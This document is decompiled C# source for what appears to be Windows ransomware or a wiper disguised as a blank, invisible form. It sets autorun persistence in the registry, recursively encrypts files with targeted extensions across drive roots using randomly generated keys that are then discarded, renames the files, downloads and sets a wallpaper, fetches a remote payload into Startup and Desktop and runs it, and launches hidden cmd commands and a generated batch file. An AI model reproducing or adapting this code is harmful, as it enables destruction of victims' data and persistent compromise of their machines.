using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ns0;

public class GForm0 : Form
{
	private byte[] byte_0 = null;

	private byte[] byte_1 = new byte[8] { 9, 7, 6, 5, 4, 3, 2, 8 };

	private const uint uint_0 = 20u;

	private const uint uint_1 = 1u;

	private const uint uint_2 = 2u;

	private IContainer icontainer_0 = null;

	private CheckBox checkBox_0;

	private TextBox textBox_0;

	public GForm0()
	{
		method_17();
	}

	private byte[] method_0(byte[] byte_2, byte[] byte_3)
	{
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_3, byte_1, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_2, 0, byte_2.Length);
				cryptoStream.Close();
			}
			byte_0 = memoryStream.ToArray();
		}
		return byte_0;
	}

	public static byte[] smethod_0(byte[] byte_2, byte[] byte_3)
	{
		byte[] array = new byte[byte_2.Length];
		byte[] array2 = new byte[2048];
		byte[] array3 = new byte[2048];
		int i;
		for (i = 0; i < 2048; i++)
		{
			array2[i] = (byte)i;
			array3[i] = byte_3[i % byte_3.GetLength(0)];
		}
		int num = 0;
		for (i = 0; i < 2048; i++)
		{
			num = (num + array2[i] + array3[i]) % 2048;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < array.GetLength(0); j++)
		{
			i = (i + 1) % 2048;
			num = (num + array2[i]) % 2048;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
			int num2 = (array2[i] + array2[num]) % 2048;
			array[j] = (byte)(byte_2[j] ^ array2[num2]);
		}
		return array;
	}

	public string method_1(int int_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < int_0--)
		{
			stringBuilder.Append(smethod_7("$ĦȠ\u0326ФԦ\u0658ݖࡔ\u0956\u0a50\u0b56\u0c54ൖ๘ཆ၄ᅆቀፆᑄᕆᙘ\u1756ᡔᥖ\u1a6a᭨ᱪᵬṢὠ\u2062Ⅼ≪⍨⑪╬♒❐⡒⥌⩊⭈ⱊⵌ⹂⽀あㅌ㉊㍈㐠㔢㘼㜺㠸㤺㨼㬲㰰㴸㸭㼧䀸䄢䈼䌤䐮")[random.Next(smethod_7("$ĦȠ\u0326ФԦ\u0658ݖࡔ\u0956\u0a50\u0b56\u0c54ൖ๘ཆ၄ᅆቀፆᑄᕆᙘ\u1756ᡔᥖ\u1a6a᭨ᱪᵬṢὠ\u2062Ⅼ≪⍨⑪╬♒❐⡒⥌⩊⭈ⱊⵌ⹂⽀あㅌ㉊㍈㐠㔢㘼㜺㠸㤺㨼㬲㰰㴸㸭㼧䀸䄢䈼䌤䐮").Length)]);
		}
		return stringBuilder.ToString();
	}

	public void method_2(string string_0, string string_1)
	{
		byte[] byte_ = File.ReadAllBytes(string_0);
		byte[] bytes = Encoding.UTF8.GetBytes(string_1);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = method_0(byte_, bytes);
		File.WriteAllBytes(string_0, bytes2);
		File.Move(string_0, string_0);
	}

	public void method_3(string string_0, string string_1)
	{
		byte[] byte_ = File.ReadAllBytes(string_0);
		byte[] bytes = Encoding.UTF8.GetBytes(string_1);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = smethod_0(byte_, bytes);
		File.WriteAllBytes(string_0, bytes2);
		method_4();
		File.Move(string_0, string_0 + smethod_7("2ŀɴͼѾգٳݡࡔ१੧\u0b65\u0c71ൡ\u0e61\u0f79\u106dᄥቩ፦ᑥᕚᘨᝦᡨᥬ\u1a61᭪"));
	}

	private string method_4()
	{
		string text = method_1(12);
		return text.ToString();
	}

	private void method_5()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(smethod_7("~ţɭ;Ѿթٵݣ\u0879३\u0a4a\u0b41\u0c53൏\u0e6c\u0f71ၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯⑻╻♮❩⡫⥘⩑⭷Ɐ"), writable: true);
		registryKey.SetValue(smethod_7("xżɦ\u0363Ѫթتݦ\u087a।"), Application.get_ExecutablePath().ToString());
	}

	public void method_6(string string_0, string string_1)
	{
		try
		{
			string[] source = new string[41]
			{
				smethod_7("*ŷɺ\u0375"),
				smethod_7("*ŧɭ\u0362"),
				smethod_7("+Šɬ\u0361ѹ"),
				smethod_7("*ŻɮͲ"),
				smethod_7("(Ŭɪ\u0367ѧչ"),
				smethod_7("*ųɦ\u0367"),
				smethod_7("*Źɫͱ"),
				smethod_7("*űɣͳ"),
				smethod_7("*ŠɱͲ"),
				smethod_7("*ůɬ\u036a"),
				smethod_7("+żɯͱѹ"),
				smethod_7("*ųɲ\u0375"),
				smethod_7("+ŴɳͶѹ"),
				smethod_7("*Ŭɦ\u0375"),
				smethod_7("*ũɲ\u0366"),
				smethod_7("*šɯͱ"),
				smethod_7("*ųɬ\u0366"),
				smethod_7("*Šɱͷ"),
				smethod_7("*Űɳ\u036d"),
				smethod_7("*Ůɦ\u0363"),
				smethod_7("*Űɮ\u036f"),
				smethod_7("*ųɪͱ"),
				smethod_7("*Ţɱͱ"),
				smethod_7("+ťɰͲѹ"),
				smethod_7("+Ŭɷ\u036fѭ"),
				smethod_7("*Żɯ\u036d"),
				smethod_7("*ųɱ\u0365"),
				smethod_7("-Šɪ"),
				smethod_7("*šɣ\u0375"),
				smethod_7("*Ůɲ\u0332"),
				smethod_7("*Ůɲ\u0335"),
				smethod_7("*Ŵɣͷ"),
				smethod_7("*Ŵɯ\u0360"),
				smethod_7("*Ţɴ\u0368"),
				smethod_7("+Šɪʹѹ"),
				smethod_7("*Ůɩͷ"),
				smethod_7("+ũɳ\u0367Ѧ"),
				smethod_7("*Ŵɯͷ"),
				smethod_7("*Ůɭͷ"),
				smethod_7("*Ŭɥ\u0366"),
				smethod_7("*űɶ\u0367")
			};
			string[] files = Directory.GetFiles(string_0);
			string[] directories = Directory.GetDirectories(string_0);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					method_2(files[i], string_1);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				method_6(directories[j], string_1);
			}
		}
		catch (Exception)
		{
		}
	}

	public void method_7(string string_0, string string_1)
	{
		try
		{
			string[] source = new string[43]
			{
				smethod_7("*ŷɺ\u0375"),
				smethod_7("*ŧɭ\u0362"),
				smethod_7("+Šɬ\u0361ѹ"),
				smethod_7("*ŻɮͲ"),
				smethod_7("(Ŭɪ\u0367ѧչ"),
				smethod_7("*ųɦ\u0367"),
				smethod_7("*Źɫͱ"),
				smethod_7("*űɣͳ"),
				smethod_7("*ŠɱͲ"),
				smethod_7("*ůɬ\u036a"),
				smethod_7("+żɯͱѹ"),
				smethod_7("*ųɲ\u0375"),
				smethod_7("+ŴɳͶѹ"),
				smethod_7("*Ŭɦ\u0375"),
				smethod_7("*ũɲ\u0366"),
				smethod_7("*šɯͱ"),
				smethod_7("*ųɬ\u0366"),
				smethod_7("*Šɱͷ"),
				smethod_7("*Űɳ\u036d"),
				smethod_7("*Ůɦ\u0363"),
				smethod_7("*Űɮ\u036f"),
				smethod_7("*ųɪͱ"),
				smethod_7("*Ţɱͱ"),
				smethod_7("+ťɰͲѹ"),
				smethod_7("+Ŭɷ\u036fѭ"),
				smethod_7("*ūɶ\u036c"),
				smethod_7("-ůɭ"),
				smethod_7("*Żɯ\u036d"),
				smethod_7("*ųɱ\u0365"),
				smethod_7("-Šɪ"),
				smethod_7("*šɣ\u0375"),
				smethod_7("*Ůɲ\u0332"),
				smethod_7("*Ůɲ\u0335"),
				smethod_7("*Ŵɣͷ"),
				smethod_7("*Ŵɯ\u0360"),
				smethod_7("*Ţɴ\u0368"),
				smethod_7("+Šɪʹѹ"),
				smethod_7("*Ůɩͷ"),
				smethod_7("+ũɳ\u0367Ѧ"),
				smethod_7("*Ŵɯͷ"),
				smethod_7("*Ůɭͷ"),
				smethod_7("*Ŭɥ\u0366"),
				smethod_7("*űɶ\u0367")
			};
			string[] files = Directory.GetFiles(string_0);
			string[] directories = Directory.GetDirectories(string_0);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					method_3(files[i], string_1);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				method_7(directories[j], string_1);
			}
		}
		catch (Exception)
		{
		}
	}

	public static void smethod_1()
	{
		Process currentProcess = Process.GetCurrentProcess();
		try
		{
			currentProcess.MinWorkingSet = (IntPtr)300000;
		}
		catch (Exception)
		{
			throw new Exception();
		}
	}

	private void method_8()
	{
		string string_ = method_1(32);
		string string_2 = method_1(256);
		method_6(smethod_7("@ĸɝ"), string_);
		method_6(smethod_7("Gĸɝ"), string_);
		method_6(smethod_7("Fĸɝ"), string_);
		method_6(smethod_7("Eĸɝ"), string_);
		method_6(smethod_7("Dĸɝ"), string_);
		method_6(smethod_7("Yĸɝ"), string_);
		method_6(smethod_7("Bĸɝ"), string_);
		string_ = null;
		method_7(smethod_7("@ĸɝ"), string_2);
		method_7(smethod_7("Gĸɝ"), string_2);
		method_7(smethod_7("Fĸɝ"), string_2);
		method_7(smethod_7("Eĸɝ"), string_2);
		method_7(smethod_7("Dĸɝ"), string_2);
		method_7(smethod_7("Yĸɝ"), string_2);
		method_7(smethod_7("Bĸɝ"), string_2);
		string_2 = null;
		smethod_1();
	}

	public void method_9()
	{
		method_10();
		Thread.Sleep(1200);
		method_10();
		Thread.Sleep(1200);
		method_10();
	}

	public void method_10()
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = smethod_7("dūɡ\u032aѦպ٤");
			processStartInfo.Arguments = smethod_7("\u0005ŪȈ\u0351ѕՖم\u0747ࡏ\u0948\u0a4e\u0b31౻\u0d65\u0e79༻ၾᅼቴ፲ᑢᕰᘴᝠ\u187aᥰ\u1a74᭠ᱹᵾḬἤ\u206bⅥ≤⌧\u2429╴♱❪⡧⥵");
			process.StartInfo = processStartInfo;
			process.Start();
			Process process2 = new Process();
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
			processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo2.FileName = smethod_7("dūɡ\u032aѦպ٤");
			processStartInfo2.Arguments = smethod_7("6śȷ\u0361Ѹս\u0670\u0732ࡢॸ੮୪\u0c62ൻ\u0e68ཥၹᅱሧ።ᑠᕨᙦ\u1776ᡤ");
			process2.StartInfo = processStartInfo2;
			process2.Start();
			Process process3 = new Process();
			ProcessStartInfo processStartInfo3 = new ProcessStartInfo();
			processStartInfo3.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo3.FileName = smethod_7("dūɡ\u032aѦպ٤");
			processStartInfo3.Arguments = smethod_7("\u000fŜȾ\u036aѾպپݴ\u0871ॹਸ਼ୱ\u0c71ൿ\u0e77ཥၵᄯቭ፬ᑸᕪᙦᝦᡯ\u1927ᨫ᭴ᱱᵪṧή");
			process3.StartInfo = processStartInfo3;
			process3.Start();
		}
		catch (Exception)
		{
		}
	}

	private static byte[] smethod_2(string string_0)
	{
		while (true)
		{
			try
			{
				using WebClient webClient = new WebClient();
				return webClient.DownloadData(string_0);
			}
			catch
			{
				Thread.Sleep(5000);
			}
		}
	}

	public static string smethod_3(string string_0, string string_1, string string_2)
	{
		byte[] array;
		using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
		{
			aesCryptoServiceProvider.Key = Convert.FromBase64String(string_1);
			aesCryptoServiceProvider.IV = Convert.FromBase64String(string_2);
			aesCryptoServiceProvider.Mode = CipherMode.CBC;
			aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
			ICryptoTransform transform = aesCryptoServiceProvider.CreateEncryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
			using MemoryStream memoryStream = new MemoryStream();
			using CryptoStream stream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
			using (StreamWriter streamWriter = new StreamWriter(stream))
			{
				streamWriter.Write(string_0);
			}
			array = memoryStream.ToArray();
		}
		return array.ToString();
	}

	private void method_11()
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFileAsync(new Uri(smethod_7(">ġȠ\u0323Сիٿݠ\u082dऩਢ\u0b65మഠ\u0e3b༤ဩᄷሠጢᐲᔱ᙮\u175cᡑᥐᨓ᭚ᱎᵍṙὔ⁞⅘≑⍝⑆╂☟✚⠗⤔⨞⬙Ⱌⴝ⸚⼓【ㄜ㈑㌗㐗㔔㘗㜪㠫㤲㨤㬫㰪㴭㸮㼢䀯䄣䈥䌤䐢䔧䘡䜶䠼䤴䨼䬽䰥䵘乍佡倳儳刪卡呯啱")), Application.get_StartupPath() + smethod_7("VŘɍ\u0361гԳتݡ\u086fॱ"));
		((Control)textBox_0).set_Text(Application.get_StartupPath() + smethod_7("VŘɍ\u0361гԳتݡ\u086fॱ"));
		Thread.Sleep(3500);
		method_16(((Control)textBox_0).get_Text(), checkBox_0.get_Checked());
	}

	private void method_12()
	{
		byte[] byte_ = smethod_2(smethod_7("0ģȢ\u0325Чթٽݾ࠳फਠ\u0b63నഢ\u0e39༪ဧᄵሢጤᐴᔳᙬᜢᠯᥒᨑ᭜᱈ᵏṛ\u1f5a⁐⅚≓⍛⑀╀☝✄⠉⤖⨜⬟Ⱊⴟ⸘⼝〞ㄞ㈓㌑㐑㔖㘕㜔㠕㤰㨦㬭㰬㴨㸢㼨䀭䄮䈤䌠䐧䔪䘣䜡䠣䤽䨽䬾䰣䵙乏佈偌兘剋區吪啫噶坠"));
		if (!File.Exists(Environment.SpecialFolder.Startup.ToString() + smethod_7("Přɏ\u0348ь\u0558\u064b\u0740\u082a५੶ୠ")))
		{
			smethod_5(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + smethod_7("Přɏ\u0348ь\u0558\u064b\u0740\u082a५੶ୠ"), byte_);
		}
		if (!File.Exists(Environment.SpecialFolder.Desktop.ToString() + smethod_7("Přɏ\u0348ь\u0558\u064b\u0740\u082a५੶ୠ")))
		{
			smethod_4(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + smethod_7("Přɏ\u0348ь\u0558\u064b\u0740\u082a५੶ୠ"), byte_);
		}
	}

	public string method_13(int int_0)
	{
		Random rand = new Random();
		return new string((from s in Enumerable.Repeat(smethod_7("ešɡ\u0365ѥՙ\u0659ݕࡕ\u0951\u0a51\u0b55\u0c55൙๙ཅ၅ᅁቁፅᑅᕙᙙ\u1755ᡕᥑᨺ\u1b38\u1c3aᴴḲἰ′ℴ∺⌸"), int_0)
			select s[rand.Next(s.Length)]).ToArray());
	}

	private void method_14()
	{
		method_5();
		method_8();
		method_11();
		method_12();
		method_15();
		method_9();
		smethod_1();
		Application.Exit();
	}

	public void method_15()
	{
		string text = method_13(8);
		StreamWriter streamWriter = new StreamWriter(text + smethod_7("*ŵɠͲ"));
		streamWriter.WriteLine(smethod_7("cŊɚ\u030dъԖ٩ݛࡍ\u0946\u0a52\u0b40౫\u0d41\u0e48ང၃ᅫሶጿᑏᕸᙨᝰᡨᥣ\u1a7f᭻ᱳᴽṔὸ⁼Ⅺ≝⍴⑿╿♯❤⡇⥥⩬⭠Ⱨ\u2d77⸠⼨"));
		streamWriter.WriteLine(smethod_7("OĆɣ\u0343щՁ\u0657\u0747ࡧ\u0949ੳ\u0b7bఽ\u0d4b\u0e68\u0f79\u106bᅱቧ።ᐻᕇᙰᝠᡸᥠ\u1a7bᭈᱸᵠṧὄ\u2068Ⅵ≢〉␥═♱❷⡤"));
		streamWriter.WriteLine(smethod_7("[ŽȲ\u0354Ѣս١ݿ\u082cख़੯\u0b7a౽൪\u0e63༥၊ᅦቺ፵"));
		streamWriter.WriteLine(smethod_7("qńɔ\u033fѨԠ\u065fݩ\u087fॸ੬୲ౙ൷\u0e7e\u0f76\u1071ᅥሸጭᑽᕬᙼᝢᠤ\u197a\u1a78\u1b71ᱩᵬṧὦ†ℨ"));
		streamWriter.WriteLine(smethod_7("iİɎ\u036cѾջٲ\u0738࠵\u0957\u0a61ୠ\u0c76ർ\u0e65\u0f79\u1060ᅠሬጬᑊᕾᙽ\u176dᡩᥲ\u1a6c\u1b6bᱭᴣḣ"));
		streamWriter.WriteLine(smethod_7("DŁɲ\u0362Ѧվٹܢࡘ०੬୭౷മ\u0e34༱\u1033ᄲረ"));
		streamWriter.WriteLine(smethod_7("üƧ\u02dbϷӣפۯޣࢠ\u09c0૬ଓ\u0c5eഄณ༎ၚᄝሗጔᐃᔘᘑ\u171d᠆ᤂ\u1a5c\u1b4fᰊᴌḘἊ⁊ℋ∉⌔␃┖♄✂⠌⤅⩀⬰Ⱚⴵ⸹⼩ぺ\u3130㈵㌧㐹㔧㘠㜲㠼㤥㩰㬩㰧㴡㸩㼸䁪䄾䈭䌵䐣䕥䘡䜭䠡䤳䨹䭏䱊䵘乘伛偛兗剜北呡啜噚块塝奆婃嬏屍嵌幂弋恄慆扜指摔敀晗杗桍楓橅欿汪浵湹潶瀺煮牱獣瑾畺癡睧砲祢穠筪籭絤繭罧耪腺艧荡葲蕲虥蝱衧褣"));
		streamWriter.WriteLine(smethod_7("DŁɲ\u0362Ѧվٹܢࡘ०੬୭౷മ\u0e34༱\u1033ᄲረ"));
		streamWriter.WriteLine(smethod_7("üƧ\u02dbϷӣפۯޣࢠ\u09c0૬ଓ\u0c5eഄณ༎ၚᄝሗጔᐃᔘᘑ\u171d᠆ᤂ\u1a5c\u1b4fᰊᴌḘἊ⁊ℋ∉⌔␃┖♄✂⠌⤅⩀⬰Ⱚⴵ⸹⼩ぺ\u3130㈵㌧㐹㔧㘠㜲㠼㤥㩰㬩㰧㴡㸩㼸䁪䄾䈭䌵䐣䕥䘡䜭䠡䤳䨹䭏䱊䵘乘伛偛兗剜北呡啜噚块塝奆婃嬏屍嵌幂弋恄慆扜指摔敀晗杗桍楓橅欿汪浵湹潶瀺煮牱獣瑾畺癡睧砲祢穠筪籭絤繭罧耪腺艧荡葲蕲虥蝱衧褣"));
		streamWriter.WriteLine(smethod_7("<ŧț\u0337УԤدݣࡠऔਲ਼\u0b5a\u0c4cഝ\u0e5dམ၎ᅐ\u1257ፙᐖᕜᙇ\u1713ᡀᥔᩁ᭚᱇ᵟṉ\u1f4f\u200aⅈ≛⌇\u2455╊♋❍⠂⥀⩓⬿Ɱ\u2d72\u2e6f⽨びㅻ㉴㍲㐶㕡㙻㜳㡠㥴㩳㭠㱸㵨㹾㼫䁾䅡䉭䌧䑠䕬䙨䝦䡱䤣"));
		streamWriter.WriteLine(smethod_7("DŁɲ\u0362Ѧվٹܢࡘ०੬୭౷മ\u0e37༴\u1033ᄲረ"));
		streamWriter.WriteLine(smethod_7("üƧ\u02dbϷӣפۯޣࢠ\u09c0૬ଓ\u0c5eഄณ༎ၚᄝሗጔᐃᔘᘑ\u171d᠆ᤂ\u1a5c\u1b4fᰊᴌḘἊ⁊ℋ∉⌔␃┖♄✂⠌⤅⩀⬰Ⱚⴵ⸹⼩ぺ\u3130㈵㌧㐹㔧㘠㜲㠼㤥㩰㬩㰧㴡㸩㼸䁪䄾䈭䌵䐣䕥䘡䜭䠡䤳䨹䭏䱊䵘乘伛偛兗剜北呡啜噚块塝奆婃嬏屍嵌幂弋恄慆扜指摔敀晗杗桍楓橅欿汪浵湹潶瀺煮牱獣瑾畺癡睧砲祢穠筪籭絤繭罧耪腺艧荡葲蕲虥蝱衧褣"));
		streamWriter.WriteLine(smethod_7("<ŧț\u0337УԤدݣࡠऔਲ਼\u0b5a\u0c4cഝ\u0e5dམ၎ᅐ\u1257ፙᐖᕜᙇ\u1713ᡀᥔᩁ᭚᱇ᵟṉ\u1f4f\u200aⅈ≛⌇\u2455╊♋❍⠂⥀⩓⬿Ɱ\u2d72\u2e6f⽨びㅻ㉴㍲㐶㕡㙻㜳㡠㥴㩳㭠㱸㵨㹾㼫䁾䅡䉭䌧䑠䕬䙨䝦䡱䤣"));
		streamWriter.WriteLine(smethod_7("BŇɰ\u0360Ѹՠٻܠ࡞ॠ੮୯౹ഠ\u0e36༴\u1035ᄴሳጲᐨ"));
		streamWriter.WriteLine(smethod_7("iİɎ\u036cѾջٲ\u0738࠵\u0957\u0a61ୠ\u0c76ർ\u0e65\u0f79\u1060ᅠሬጬᑊᕾᙽ\u176dᡩᥲ\u1a6c\u1b6bᱭᴣḣ"));
		streamWriter.WriteLine(smethod_7("DŁɲ\u0362Ѧվٹܢࡘ०੬୭౷മ\u0e34༱\u1033ᄲረ"));
		streamWriter.WriteLine(smethod_7("üƧ\u02dbϷӣפۯޣࢠ\u09c0૬ଓ\u0c5eഄณ༎ၚᄝሗጔᐃᔘᘑ\u171d᠆ᤂ\u1a5c\u1b4fᰊᴌḘἊ⁊ℋ∉⌔␃┖♄✂⠌⤅⩀⬰Ⱚⴵ⸹⼩ぺ\u3130㈵㌧㐹㔧㘠㜲㠼㤥㩰㬩㰧㴡㸩㼸䁪䄾䈭䌵䐣䕥䘡䜭䠡䤳䨹䭏䱊䵘乘伛偛兗剜北呡啜噚块塝奆婃嬏屍嵌幂弋恄慆扜指摔敀晗杗桍楓橅欿汪浵湹潶瀺煮牱獣瑾畺癡睧砲祢穠筪籭絤繭罧耪腺艧荡葲蕲虥蝱衧褣"));
		streamWriter.WriteLine(smethod_7("<ŧț\u0337УԤدݣࡠऔਲ਼\u0b5a\u0c4cഝ\u0e5dམ၎ᅐ\u1257ፙᐖᕜᙇ\u1713ᡀᥔᩁ᭚᱇ᵟṉ\u1f4f\u200aⅈ≛⌇\u2455╊♋❍⠂⥀⩓⬿Ɱ\u2d72\u2e6f⽨びㅻ㉴㍲㐶㕡㙻㜳㡠㥴㩳㭠㱸㵨㹾㼫䁾䅡䉭䌧䑠䕬䙨䝦䡱䤣"));
		streamWriter.WriteLine(smethod_7("DŁɲ\u0362Ѧվٹܢࡘ०੬୭౷മ\u0e34༱\u1033ᄲረ"));
		streamWriter.WriteLine(smethod_7("üƧ\u02dbϷӣפۯޣࢠ\u09c0૬ଓ\u0c5eഄณ༎ၚᄝሗጔᐃᔘᘑ\u171d᠆ᤂ\u1a5c\u1b4fᰊᴌḘἊ⁊ℋ∉⌔␃┖♄✂⠌⤅⩀⬰Ⱚⴵ⸹⼩ぺ\u3130㈵㌧㐹㔧㘠㜲㠼㤥㩰㬩㰧㴡㸩㼸䁪䄾䈭䌵䐣䕥䘡䜭䠡䤳䨹䭏䱊䵘乘伛偛兗剜北呡啜噚块塝奆婃嬏屍嵌幂弋恄慆扜指摔敀晗杗桍楓橅欿汪浵湹潶瀺煮牱獣瑾畺癡睧砲祢穠筪籭絤繭罧耪腺艧荡葲蕲虥蝱衧褣"));
		streamWriter.WriteLine(smethod_7("<ŧț\u0337УԤدݣࡠऔਲ਼\u0b5a\u0c4cഝ\u0e5dམ၎ᅐ\u1257ፙᐖᕜᙇ\u1713ᡀᥔᩁ᭚᱇ᵟṉ\u1f4f\u200aⅈ≛⌇\u2455╊♋❍⠂⥀⩓⬿Ɱ\u2d72\u2e6f⽨びㅻ㉴㍲㐶㕡㙻㜳㡠㥴㩳㭠㱸㵨㹾㼫䁾䅡䉭䌧䑠䕬䙨䝦䡱䤣"));
		streamWriter.WriteLine(smethod_7("DŁɲ\u0362Ѧվٹܢࡘ०੬୭౷മ\u0e37༴\u1033ᄲረ"));
		streamWriter.WriteLine(smethod_7("üƧ\u02dbϷӣפۯޣࢠ\u09c0૬ଓ\u0c5eഄณ༎ၚᄝሗጔᐃᔘᘑ\u171d᠆ᤂ\u1a5c\u1b4fᰊᴌḘἊ⁊ℋ∉⌔␃┖♄✂⠌⤅⩀⬰Ⱚⴵ⸹⼩ぺ\u3130㈵㌧㐹㔧㘠㜲㠼㤥㩰㬩㰧㴡㸩㼸䁪䄾䈭䌵䐣䕥䘡䜭䠡䤳䨹䭏䱊䵘乘伛偛兗剜北呡啜噚块塝奆婃嬏屍嵌幂弋恄慆扜指摔敀晗杗桍楓橅欿汪浵湹潶瀺煮牱獣瑾畺癡睧砲祢穠筪籭絤繭罧耪腺艧荡葲蕲虥蝱衧褣"));
		streamWriter.WriteLine(smethod_7("<ŧț\u0337УԤدݣࡠऔਲ਼\u0b5a\u0c4cഝ\u0e5dམ၎ᅐ\u1257ፙᐖᕜᙇ\u1713ᡀᥔᩁ᭚᱇ᵟṉ\u1f4f\u200aⅈ≛⌇\u2455╊♋❍⠂⥀⩓⬿Ɱ\u2d72\u2e6f⽨びㅻ㉴㍲㐶㕡㙻㜳㡠㥴㩳㭠㱸㵨㹾㼫䁾䅡䉭䌧䑠䕬䙨䝦䡱䤣"));
		streamWriter.Close();
		Process.Start(text + smethod_7("*ŵɠͲ"));
		text = smethod_7("\\śɚ\u0359");
	}

	private static bool smethod_4(string string_0, byte[] byte_2)
	{
		if (!Process.GetCurrentProcess().MainModule!.FileName!.Equals(string_0, StringComparison.CurrentCultureIgnoreCase))
		{
			FileStream fileStream = null;
			try
			{
				fileStream = (File.Exists(string_0) ? new FileStream(string_0, FileMode.Create) : new FileStream(string_0, FileMode.CreateNew));
				fileStream.Write(byte_2, 0, byte_2.Length);
				fileStream.Dispose();
				Process.Start(string_0);
				return true;
			}
			catch
			{
				return false;
			}
		}
		return false;
	}

	private static bool smethod_5(string string_0, byte[] byte_2)
	{
		if (!Process.GetCurrentProcess().MainModule!.FileName!.Equals(string_0, StringComparison.CurrentCultureIgnoreCase))
		{
			FileStream fileStream = null;
			try
			{
				fileStream = (File.Exists(string_0) ? new FileStream(string_0, FileMode.Create) : new FileStream(string_0, FileMode.CreateNew));
				fileStream.Write(byte_2, 0, byte_2.Length);
				fileStream.Dispose();
				return true;
			}
			catch
			{
				return false;
			}
		}
		return false;
	}

	private static void smethod_6()
	{
		ProcessStartInfo startInfo = null;
		try
		{
			startInfo = new ProcessStartInfo
			{
				Arguments = smethod_7("\fšȁ\u0343ѷձٴݿ\u087e\u093aਸ਼\u0b5bష൏\u0e35༻ၝᄲሾፔᐯᕗᘭᜣᡟ\u192aᨸᬨᰡᴦṁὡ\u206f™∣") + Process.GetCurrentProcess().MainModule!.FileName + smethod_7("#"),
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = smethod_7("dūɡ\u032aѦպ٤")
			};
		}
		catch
		{
		}
		finally
		{
			Process.Start(startInfo);
			Environment.Exit(0);
		}
	}

	private void GForm0_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		method_14();
		smethod_1();
	}

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool SystemParametersInfo(uint uint_3, uint uint_4, string string_0, uint uint_5);

	private void method_16(string string_0, bool bool_0)
	{
		try
		{
			uint uint_ = 0u;
			if (bool_0)
			{
				uint_ = 3u;
			}
			if (!SystemParametersInfo(20u, 0u, string_0, uint_))
			{
			}
		}
		catch (Exception)
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void method_17()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		checkBox_0 = new CheckBox();
		textBox_0 = new TextBox();
		((Control)this).SuspendLayout();
		((Control)checkBox_0).set_AutoSize(true);
		((Control)checkBox_0).set_Location(new Point(12, 12));
		((Control)checkBox_0).set_Name(smethod_7("rŸɤ\u035bѽը٪ݾ\u086cग़\u0a62ୡ౬൷\u0e77\u0f70ၸ"));
		((Control)checkBox_0).set_Size(new Size(98, 17));
		((Control)checkBox_0).set_TabIndex(0);
		((Control)checkBox_0).set_Text(smethod_7("5ĳȾ\u033fнԳذ\u0730࠰व\u0a37ଵ"));
		((ButtonBase)checkBox_0).set_UseVisualStyleBackColor(true);
		((Control)textBox_0).set_Location(new Point(12, 40));
		((Control)textBox_0).set_Name(smethod_7("cİȰ\u0330еԷص"));
		((Control)textBox_0).set_Size(new Size(199, 20));
		((Control)textBox_0).set_TabIndex(1);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(223, 72));
		((Control)this).get_Controls().Add((Control)(object)textBox_0);
		((Control)this).get_Controls().Add((Control)(object)checkBox_0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name(smethod_7("Cūɱ\u036fа"));
		((Form)this).set_ShowIcon(false);
		((Control)this).set_Text(smethod_7("eťɽ\u036dѷէ١ܪࡦॺ\u0a64"));
